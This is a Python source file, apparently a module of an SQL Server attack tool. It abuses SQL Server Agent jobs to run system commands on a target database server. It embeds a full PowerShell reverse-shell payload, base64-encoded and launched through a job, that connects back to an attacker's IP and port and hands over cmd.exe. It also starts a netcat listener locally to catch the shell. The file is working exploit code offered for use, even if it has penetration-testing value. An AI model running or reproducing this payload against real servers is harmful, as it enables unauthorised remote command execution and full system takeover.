#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging, time, subprocess, base64
from Mssql import Mssql
from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, ErrorClass
from Constants import *
from threading import Thread

class Jobs (Mssql):
	'''
	To execute system commands on the target thanks to SQL Server Agent Stored Procedures (Jobs)
	'''
	#CONSTANTS
	CMD_TYPES = ['CMDEXEC','POWERSHELL']
	REQ_CREATE_JOB = "exec sp_add_job @job_name = '{0}'" #{0} name
	REQ_STEP_JOB = "exec sp_add_jobstep @job_name= '{0}' ,@step_name = '{1}' ,@subsystem= '{2}' ,@command= '{3}'" #{0} name, {1} description, {2} type of cmd, {3} cmd
	REQ_ADD_JOB = "exec sp_add_jobserver @job_name = '{0}' ,@server_name = '{1}'" #{0} name, {1} serverName
	REQ_EXEC_JOB = "exec sp_start_job @job_name= '{0}'" #{0} name
	REQ_DEL_JOB = "exec sp_delete_job @job_name=  '{0}'" #{0} name
	REQ_GET_STATUS = "exec sp_help_job @JOB_NAME = '{0}', @job_aspect='JOB'" #{0} name
	ERROR_ALREADY_EXISTS = "already exists"
	LAST_RUN_OUTCOME = {'Failed':0, 'Succeeded':1, 'Canceled':3, 'Unknown':5} #Outcome of the job the last time it ran
	LAST_RUN_OUTCOME_INV = {v: k for k, v in LAST_RUN_OUTCOME.items()}
	R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};' #{0} IP, {1} port
	R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"#{0} powershell code base64 encoded
	NC_CMD = "nc -l -v {0}" #{0} port
	
	def __init__(self, args):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		self.args = args
		self.spName = "LDZIHNIUDJFEOKPOKDPEOK"
		self.sleepStatus = SLEEP_TIME_BEFORE_TO_GET_STATUS
		
	def __createJob__(self, deleteOldSP=True):
		'''
		Create a job named self.spName
		Return True if no error.
		Returns exception if error
		'''
		logging.info("Creating the job {0}".format(self.spName))
		data = self.executeRequest(self.REQ_CREATE_JOB.format(self.spName), noResult=True)
		if isinstance(data,Exception):
			if self.ERROR_ALREADY_EXISTS in str(data):
				data = self.__delJob__()
				if isinstance(data,Exception):
					logging.info("Impossible to delete the stored procedure")
					return data
				else:
					data= self.__createJob__(deleteOldSP=False)
					if isinstance(data,Exception): return data
					else: return True
			else:
				return data
		else:
			logging.debug("The job has been created") 
			return True	
			
	def __setJob__(self, cmd, descritpion="MSDAT", cmdType="CMDEXEC"):
		'''
		Set the job to execute the cmd (type = cmdType) and set the desc
		Return True if no error.
		Returns exception if error
		'''
		logging.info("Setting the job {0} (Description:'{1}') to execute the cmd '{2}' ('{3}' type)".format(self.spName, descritpion, cmd, cmdType))
		data = self.executeRequest(self.REQ_STEP_JOB.format(self.spName, descritpion, cmdType, cmd), noResult=True)
		if isinstance(data,Exception):  
			return data
		else:
			logging.debug("The job has been set") 
			return True
			
	def __addJob__(self, serverName="(LOCAL)"):
		'''
		Define the job for the local server
		Returns True if no error
		Returns exception if error
		'''
		logging.info("Defining the job {0} for the server '{1}')".format(self.spName, serverName))
		data = self.executeRequest(self.REQ_ADD_JOB.format(self.spName, serverName), noResult=True)
		if isinstance(data,Exception):  
			return data
		else:
			logging.debug("The job has been defined") 
			return True

	def __execJob__(self):
		'''
		execute the job
		Returns True if no error
		Returns exception if error
		'''
		logging.info("Executing the job {0})".format(self.spName))
		data = self.executeRequest(self.REQ_EXEC_JOB.format(self.spName), noResult=True)
		if isinstance(data,Exception):  
			return data
		else:
			logging.debug("The job has been executed") 
			return True
	
	def __delJob__(self):
		'''
		Delete the job
		Returns True if no error
		Returns exception if error
		'''
		logging.info("Deleting the job {0})".format(self.spName))
		data = self.executeRequest(self.REQ_DEL_JOB.format(self.spName), noResult=True)
		if isinstance(data,Exception):  
			return data
		else:
			logging.debug("The job has been deleted") 
			return True
			
	def __getJobStatus__(self):
		'''
		Get the status of the job executed
		Returns columns
		Returns exception if error
		'''
		data = self.executeRequest(self.REQ_GET_STATUS.format(self.spName),ld=["job_id","originating_server",
							"name","enabled","description","start_step_id",
							"category","owner","notify_level_eventlog",
							"notify_level_email","notify_level_netsend","notify_level_page",
							"notify_email_operator","notify_netsend_operator",
							"notify_page_operator","delete_level","date_created","date_modified",
							"version_number","last_run_date","last_run_time","last_run_outcome","next_run_date",
							"next_run_time","next_run_schedule_id","current_execution_status","current_execution_step",
							"current_retry_attempt","has_step","has_schedule","has_target","type"])
		if isinstance(data,Exception): 
			return data
		else:
			return data
	
	def __getJobStatusValue__(self):
		'''
		Returns the status (LAST_RUN_OUTCOME) of the job ONLY (integer value)
		Returns exception if error
		'''
		logging.debug("Getting the job status thanks to the value last_run_outcome")
		status = self.__getJobStatus__()
		if isinstance(status,Exception):
			logging.debug("Impossible to get the status of the job. Perhaps there is no error during execution: {0}".format(status))
			return status
		else:
			if len(status) > 0: 
				return status[0]['last_run_outcome']
			else:
				msg = "Impossible to get the status of the job. No entry retrieved in the table for this job. Perhaps the cmd has been executed..."
				logging.debug(msg)
				return ErrorClass(msg)
				
	def getJobStatus(self):
		'''
		get the status of the last job executed
		Returns True if no error
		Returns None if execution status == Unknown
		Returns False if not executed correctly
		Returns exception if error
		'''
		time.sleep(self.sleepStatus)
		statusVal = self.__getJobStatusValue__()
		if isinstance(statusVal,Exception):
			logging.info("Impossible to get the status value for this job: {0}".format(statusVal))
			return statusVal
		if statusVal == self.LAST_RUN_OUTCOME['Succeeded']:
			logging.info("The last_run_outcome value is {0} ('{1}'), good news".format(statusVal, self.LAST_RUN_OUTCOME_INV[statusVal]))
			return True
		elif statusVal == self.LAST_RUN_OUTCOME['Unknown']:
			logging.info("The status is '{0}': The job is running, no status yet".format(self.LAST_RUN_OUTCOME_INV[statusVal]))
			return None
		elif statusVal == self.LAST_RUN_OUTCOME['Failed']:
			logging.info("The last_run_outcome value is {0} ('{1}'): The job has failed. Perhaps a mistake in the cmd...".format(statusVal, self.LAST_RUN_OUTCOME_INV[statusVal]))
			return False
		else:
			msg = "The last_run_outcome value is {0} ('{1}'). Status Unknown!".format(statusVal, self.LAST_RUN_OUTCOME_INV[statusVal])
			logging.info(msg)
			return ErrorClass(msg)
		
	
	def createAndExecuteJob(self, cmd="", descritpion="MDAT", cmdType="CMDEXEC", serverName="(LOCAL)"):
		'''
		Create and execute a new job
		Returns True if no error
		Returns exception if error
		'''
		logging.info("Creating and executing the job {0})".format(self.spName))
		status = self.useThisDB("msdb")
		if isinstance(status,Exception): 
			logging.info("Impossible to move to the database msdb: {0}".format(status))
			return status
		status = self.__createJob__()
		if isinstance(status,Exception): 
			logging.info("Impossible to create the job: {0}".format(status))
			return status
		status = self.__setJob__(cmd, descritpion, cmdType)
		if isinstance(status,Exception): 
			logging.info("Impossible to set the job: {0}".format(status))
			return status
		status = self.__addJob__(serverName)
		if isinstance(status,Exception):
			logging.info("Impossible to add the job: {0}".format(status))
			return status
		status = self.__execJob__()
		if isinstance(status,Exception): 
			logging.info("Impossible to execute the job: {0}".format(status))
			return status
		return True
		
	def __runListenNC__ (self,port=None):
		'''
		nc listen on the port
		'''
		ncCmd = self.NC_CMD.format(port)
		try :
			logging.info('Listening for a remote connection on the local port {0} with the command "{1}"'.format(port, ncCmd))
			subprocess.call(ncCmd, shell=True)
		except KeyboardInterrupt:
			logging.info("Connection closed locally")
			pass
		
	def getInteractiveReverseShell(self, localip, localport):
		'''
		Give you an interactive reverse shell with powershell command
		Returns True if no error
		Returns exception if error
		'''
		logging.info("The powershell reverse shell tries to connect to {0}:{1}".format(localip,localport))
		a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
		a.start()
		cmdAndPayload = self.R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode("".join([c+'\x00' for c in self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport)])))
		try :
			status = self.createAndExecuteJob(cmd=cmdAndPayload, descritpion="MDAT", cmdType="CMDEXEC", serverName="(LOCAL)")
			if isinstance(status,Exception):
				return status
		except KeyboardInterrupt: 
			pass
		return True
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Can you use SQL Server Agent Stored Procedures (jobs) to execute system commands?")
		status = self.createAndExecuteJob(cmd="whoami", descritpion="MDAT", cmdType="CMDEXEC", serverName="(LOCAL)")
		if status != True:
			self.args['print'].badNews("KO")
		status = self.getJobStatus()
		if isinstance(status,Exception) or status==False:
			self.args['print'].badNews("KO")
		elif status == None:
			self.args['print'].unknownNews("? (Job or cmd is still running)")
		else :
			self.args['print'].goodNews("OK")
			
def runJobsModule(args):
	'''
	Run the Jobs module
	'''
	if checkOptionsGivenByTheUser(args,["test-module", "exec", "reverse-shell"], checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	cmdType = ""
	jobs = Jobs(args)
	jobs.connect()
	if args["sleep-status"] != "": jobs.sleepStatus = args["sleep-status"]
	if args["sp-name"] != "": jobs.spName = args["sp-name"]
	if args["test-module"] == True: jobs.testAll()
	if args["exec"] != None: 
		args['print'].title("Try to execute the system command with SQL Server Agent Stored Procedures (Jobs)")
		if args["type"] != "": cmdType = args["type"]
		else: cmdType = "CMDEXEC"
		status = jobs.createAndExecuteJob(cmd=args["exec"], descritpion="MDAT", cmdType=cmdType, serverName="(LOCAL)")
		if status != True:
			args['print'].badNews("Impossible to create a job and to execute it: {0}".format(status))
		else:
			status = jobs.getJobStatus()
			if status == True:
				args['print'].goodNews("The job to execute the system command has been created and executed")
			elif status == False:
				args['print'].badNews("The job to execute the system command has not been executed because there is probably a mistake in your command")
			elif status == None:
				args['print'].unknownNews("The job status is unknown because it is still running")
			else :
				args['print'].badNews("The system command has NOT been executed on the database server: {0}".format(status))
	if args["reverse-shell"] != None: 
		args['print'].title("Try to give you a reverse shell with SQL Server Agent Stored Procedures (Jobs)")
		status = jobs.getInteractiveReverseShell(args['reverse-shell'][0], args['reverse-shell'][1])





